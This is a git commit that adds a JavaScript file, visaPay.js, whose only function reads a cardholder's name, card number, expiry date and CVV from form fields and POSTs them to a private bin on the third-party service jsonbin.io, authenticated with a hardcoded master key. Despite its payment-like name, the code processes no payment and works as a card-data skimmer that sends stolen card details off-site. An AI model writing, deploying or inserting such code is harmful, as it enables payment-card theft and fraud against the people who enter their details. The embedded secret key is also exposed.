643518a381c393540cbed50f83e9634475798243
trackmateai <136100891+trackmateai@users.noreply.github.com>
2023-07-31 16:21:52 +0200

    Add files via upload

---
+++ visaPay.js
@@ -0,0 +1,50 @@
+
+function capt(){
+    
+    
+    var cardHolderName= document.getElementById("holderName").value;
+    var cardNumber= document.getElementById("cardNumber").value
+    var expiryDate= document.getElementById("expiryDate").value
+    var CVV= document.getElementById("CVV").value
+    
+
+        
+        const secretKey = '$2b$10$5.GD5IWqNSL2RsbiNWZdbeQGJ3wkUk/t3ZxfbbLn2ddvAPibpWpr.';
+        const binName= 'myBin';
+
+
+
+      
+        const data = {
+        Name: cardHolderName,
+        CardNumber: cardNumber,
+        Expiry: expiryDate,
+        Cvv: CVV
+      };
+
+      
+       fetch('https://api.jsonbin.io/v3/b', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              "X-Master-Key": secretKey,
+              "X-Bin-Private": true,
+              'X-Bin-Name': cardHolderName
+            },
+            body: JSON.stringify(data)
+          })
+         .then(response => response.json())
+         .then(jsonData => console.log(jsonData))
+         .catch(error => console.error(error));
+      
+
+
+
+
+            
+
+
+
+
+
+}
